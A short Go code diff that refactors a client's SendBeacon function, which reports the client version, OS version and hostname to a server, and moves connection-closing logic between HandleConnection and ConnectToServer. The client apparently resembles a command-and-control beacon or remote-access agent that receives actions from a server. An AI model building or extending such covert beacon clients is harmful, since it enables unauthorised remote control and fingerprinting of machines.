@@ -356,7 +356,7 @@ func SendBeacon() error {
 	if err != nil {
 		return fmt.Errorf("failed to get hostname: %v", err)
 	}
-	payloadData := map[string]interface{}{
+	SendCommand(map[string]interface{}{
 		"response": map[string]interface{}{
 			"beacon":   true,
 			"version":  CVER,
@@ -366,12 +366,7 @@ func SendBeacon() error {
 			"osver":    osver,
 			"hostname": hostname,
 		},
-	}
-	payloadBytes, err := json.Marshal(payloadData)
-	if err != nil {
-		return fmt.Errorf("failed to marshal JSON payload: %v", err)
-	}
-	SendCommand(string(payloadBytes))
+	})
 	return nil
 }
 
@@ -672,8 +667,6 @@ func ParseAction(action string) error {
 }
 
 func HandleConnection(conn net.Conn) error {
-	defer conn.Close()
-
 	reader := bufio.NewReader(conn)
 	var fullData bytes.Buffer
 
@@ -710,6 +703,7 @@ func ConnectToServer() {
 				WriteLog("Connection error: %v", err)
 				exitProcess = true
 			}
+			defer conn.Close()
 			WriteLog("Client " + CVER + " connected.")
 			client = conn
 			client.SetDeadline(time.Time{})
